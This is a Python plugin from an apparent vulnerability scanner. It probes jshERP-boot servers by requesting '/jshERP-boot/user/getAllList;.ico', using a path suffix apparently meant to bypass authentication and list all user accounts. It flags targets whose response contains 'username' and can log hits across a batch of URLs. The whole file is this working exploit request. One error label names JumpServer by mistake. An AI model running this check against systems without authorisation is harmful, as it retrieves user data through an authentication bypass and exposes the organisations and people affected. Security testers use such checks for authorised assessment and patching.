#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet

urllib3.disable_warnings()


class JshErpBootScan:

    def run(self, urls):
        try:
            url = urls + '/jshERP-boot/user/getAllList;.ico'
            response = requests.get(url,headers=self.headers, verify=self.ssl, timeout=self.timeout, proxies=self.proxy)
            if response.status_code == 200 and "username" in response.text:
                OutPrintInfoSuc("JshErpBoot", f'存在敏感信息泄漏 {url}')
                if self.batch:
                    with open("./result/jsherpboot_info_vuln.txt","a") as w:
                        w.write(f"{url}\n")
            else:
                if not self.batch:
                    OutPrintInfo("JshErpBoot", '不存在敏感信息泄漏')

        except Exception:
            if not self.batch:
                OutPrintInfo("JumpServer", '目标访问失败')
    def main(self, target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.timeout = int(target["timeout"])
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("JshErpBoot", '开始检测敏感信息泄漏...')
        self.run(url)
        if not self.batch:
            OutPrintInfo("JshErpBoot", '存在敏感信息泄漏检测结束')